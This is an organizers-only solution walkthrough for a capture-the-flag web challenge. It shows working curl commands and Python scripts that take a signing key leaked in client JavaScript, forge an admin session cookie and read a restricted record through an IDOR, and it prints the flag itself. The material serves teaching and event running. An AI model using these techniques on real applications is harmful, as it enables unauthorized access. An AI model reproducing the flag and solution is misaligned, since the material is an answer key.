# Firewall 2 — Web Application Challenge (Hack-A-PI)
## ORGANIZERS ONLY — Flag & Solution Walkthrough

> Keep this file **off the participant network and out of the Go-Bag.**
> It is not copied into the Docker image (see `.dockerignore`).

> **Event framing:** in the combined Hack-A-PI deployment this is **Firewall 2**
> (web exploitation). Players arrive here from **Firewall 1** (the OSINT stage),
> which hands them the path `/internal-portal` — so in the combined event the
> "discover the portal" recon below is already done by Firewall 1. Start teams
> at **Stage 2 (forge the cookie)**. The standalone recon (Stage 0) is kept for
> reference / running F2 on its own.

---

## Challenge at a glance

| Field | Value |
|---|---|
| Firewall | 2 — Web Application Challenge |
| Category | Web Exploitation |
| Company (cover) | **NPC Inc** |
| Vulnerable author (lore) | **Dani Parkar** (the intern) |
| OWASP mapping | A01:2021 Broken Access Control (session forgery + IDOR), A05 Security Misconfiguration (secret in client JS) |
| Flag | `FLAG{br0k3n_4cc3ss_c0ntr0l_d4n1_p4rk4r}` |
| Flag format | `FLAG{...}` — lowercase leetspeak, underscores, no spaces |
| Flag location | Incident report **#4663** (Dani's auto-generated exception log), runtime-context dump |
| Est. solve time | 20–40 min for a mixed team with the NPC hint ladder available |

The flag is the **single** objective. One flag = full chain (recon → privilege
escalation → IDOR). There are no intermediate flag strings in the app, by
design — the portal plays it completely straight.

---

## The vulnerability chain (3 stages)

```
  Stage 0            Stage 1              Stage 2                 Stage 3
  Recon        →     Guest session   →   Privilege escalation →  IDOR            →  FLAG
  find hidden        land on portal      forge admin cookie      read restricted
  /internal-portal   as "guest"          with leaked signing     incident #4663
  (handed by F1 in                       key from static JS      via object URL
   the combined event)
```

Each stage is **gated** — you cannot skip ahead:
- The admin console and the incident endpoint both require `role == admin`;
  a guest gets `403`. (Verified.)
- The session cookie is HMAC-signed and the signature **is** checked, so you
  cannot just flip `guest`→`admin` in the payload. You need the signing key.
  The key is leaked in a client-served JS file (Dani's mistake). (Verified: a
  cookie signed with the wrong key is rejected `403`.)
- The final report `#4663` is filtered out of the dashboard's "View" controls
  but is still served by the per-object endpoint — the IDOR.

---

## Full proof-of-concept

Replace `TARGET` with the deployed host. On the event Pi that is the combined
site, e.g. `http://192.168.0.191:5000`.

```bash
TARGET=http://127.0.0.1:5000
```

### Stage 0 — Recon: discover the hidden portal

**Combined event:** skip this — Firewall 1 already gives the team
`/internal-portal`. (Standalone F2 only: any ONE of the following reveals it,
redundant on purpose.)

```bash
# (a) HTML comment left by the intern — visible in "View Source" (standalone F2)
curl -s $TARGET/ | grep -i internal-portal
#   <!-- ... internal staff portal relocated to /internal-portal ... -->

# (b) Leftover engineering response header (standalone F2)
curl -s -D - -o /dev/null $TARGET/ | grep -i x-powered-by
#   X-Powered-By: NPC-Portal/2.3 (/internal-portal)

# (c) robots.txt (standalone F2)
curl -s $TARGET/robots.txt
#   Disallow: /internal-portal
```

> Note: in the **combined** site the root `/`, `/robots.txt`, etc. belong to
> Firewall 1, so these F2 self-leaks are not served there — which is fine,
> because F1 is the recon stage.

### Stage 1 — Land on the portal as guest

```bash
curl -s -D - -o /dev/null $TARGET/internal-portal | grep -i set-cookie
#   Set-Cookie: session=eyJyb2xlIjoiZ3Vlc3QiLCJ1c2VybmFtZSI6Imd1ZXN0In0.<sig>; Path=/; SameSite=Lax
```

Decode the cookie payload (before the `.`):

```bash
echo 'eyJyb2xlIjoiZ3Vlc3QiLCJ1c2VybmFtZSI6Imd1ZXN0In0' | base64 -d
#   {"role":"guest","username":"guest"}
```

The portal shows the **Admin Console** card locked: *"Administrator access required."*
That is the objective: become `admin`.

### Stage 2 — Recover the leaked signing key, forge an admin cookie

The portal page loads `/static/js/session.js`. It contains the signing key:

```bash
curl -s $TARGET/static/js/session.js | grep -i signingKey
#   signingKey: "npc-portal-prod-2026-7f3a", // FIXME: rotate + move server-side before launch
```

Forge a valid `admin` cookie with that key:

```python
# forge.py
import base64, hmac, json
from hashlib import sha256

KEY = b"npc-portal-prod-2026-7f3a"
payload = json.dumps({"role": "admin", "username": "admin"},
                     separators=(",", ":"), sort_keys=True).encode()
p = base64.urlsafe_b64encode(payload).decode().rstrip("=")
sig = hmac.new(KEY, p.encode(), sha256).hexdigest()
print(f"{p}.{sig}")
```

Output (stable as long as the signing key is unchanged):

```
eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.a5317cadb2565ed4fb48eab4250a68b9c4b6d0ae2f9e9968eb7fb3547223282e
```

Set it as the `session` cookie. Browser path: **DevTools → Application →
Cookies → edit `session`** and paste the forged value, then reload. The role
badge flips to **Administrator** and the **Admin Console** unlocks.

### Stage 3 — IDOR into Dani's restricted exception log

As admin, the dashboard (`/internal-portal/admin`) lists report **#4663**
("Auto-generated Exception", SYSTEM, Critical) but its "View" button is
**disabled** ("Restricted"). The breadcrumb to it is in report **#2087**, which
says the stack trace was *"written to auto-generated exception log #4663
(SYSTEM, restricted)."*

Request the object directly — the endpoint does not enforce the restriction:

```bash
ADMIN='eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.a5317cadb2565ed4fb48eab4250a68b9c4b6d0ae2f9e9968eb7fb3547223282e'
curl -s --cookie "session=$ADMIN" $TARGET/internal-portal/incident/4663 | grep -o 'FLAG{[^}]*}'
#   FLAG{br0k3n_4cc3ss_c0ntr0l_d4n1_p4rk4r}
```

Browser path: with the admin cookie set, navigate to
`/internal-portal/incident/4663`. The flag is in the runtime-context dump
(`PORTAL_ADMIN_BOOTSTRAP_TOKEN=`).

---

## One-command full solve (for the dry-run checklist, item D)

This reads the live signing key, so it works regardless of the key value.

```bash
TARGET=http://127.0.0.1:5000 python3 - <<'PY'
import base64, hmac, json, os, re, urllib.request
from hashlib import sha256
T = os.environ["TARGET"]
key = re.search(r'signingKey:\s*"([^"]+)"',
        urllib.request.urlopen(T+"/static/js/session.js").read().decode()).group(1)
pl = base64.urlsafe_b64encode(json.dumps({"role":"admin","username":"admin"},
        separators=(",",":"),sort_keys=True).encode()).decode().rstrip("=")
cookie = pl+"."+hmac.new(key.encode(), pl.encode(), sha256).hexdigest()
req = urllib.request.Request(T+"/internal-portal/incident/4663",
        headers={"Cookie":"session="+cookie})
body = urllib.request.urlopen(req).read().decode()
print(re.search(r"FLAG\{[^}]+\}", body).group(0))
PY
```

---

## Teaching points (for the debrief / scoreboard writeups)

1. **Never trust the client for authorization.** The cookie *was* signed — the
   failure was shipping the signing key to the browser (A05). Signing is
   worthless if the key is public.
2. **Hidden ≠ protected.** `robots.txt` and an undocumented path are discovery
   controls, not access controls.
3. **Authorize every object, every request (IDOR / A01).** Filtering the UI
   listing is not enough; the object endpoint must re-check permission. This is
   the single most common real-world web bug.

## Rotating for the real event (see handoff checklist, item C)

- **Flag:** set `FLAG=FLAG{your_new_flag}` in a `.env` file (see `.env.example`)
  and `docker compose up -d`. No rebuild needed. The flag appears only in
  report #4663.
- **Do NOT change the signing key** (`npc-portal-prod-2026-7f3a`) unless you also
  edit it in both `app.py` and `static/js/session.js` — they must match, and the
  forged-cookie value above assumes the default key. Rotating the flag is the
  supported change; rotating the key is not necessary and will invalidate the
  example cookie in this doc.
